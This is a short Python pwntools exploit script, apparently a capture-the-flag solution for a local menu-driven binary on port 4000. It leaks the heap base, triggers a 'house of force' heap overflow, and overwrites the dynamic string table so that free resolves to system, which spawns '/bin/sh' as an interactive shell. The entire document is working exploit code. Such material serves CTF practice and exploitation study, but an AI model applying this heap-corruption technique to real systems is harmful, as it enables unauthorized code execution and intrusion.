#!/usr/bin/env python
from pwn import *

r = remote('127.0.0.1', 4000)

def update_key(key):
    r.sendlineafter('choice(1-4):', '1')
    r.sendafter('16-bit key:', key)

def edit_secret(secret):
    r.sendlineafter('choice(1-4):', '2')
    r.sendafter('secret:', secret)

def sign_name(length, name):
    r.sendlineafter('choice(1-4):', '3')
    r.sendlineafter('length:', str(length))
    r.sendlineafter('name:', name)

def leave():
    r.sendlineafter('choice(1-4):', '4')

dynamic_strtab = 0x10ea4

# leak heap base
r.sendafter('key:', 'a'*8)
r.recvuntil('a'*8)
heap_base = u32(r.recvuntil(' ')[:-1].ljust(4, '\x00')) - 0x8
log.success('heap base: ' + hex(heap_base))
nb = ((dynamic_strtab-0x8) - (heap_base+0x10)) - 0x8
log.info('nb: ' + hex(nb))

r.sendafter('key:', 'security')

# trigger house of force
edit_secret('/bin/sh\x00'.ljust(12, 'A')+p32(0xffffffff)+'system\x00')
r.sendlineafter('choice(1-4):', '3')
r.sendlineafter('length:', str(nb))

# get chunk in dynamic section and overwrite strtab
update_key(p32(0x5)+p32(heap_base+0x18-0x79)+p32(6)+p32(0x8294))
# trigger free (system)
leave()

r.interactive()
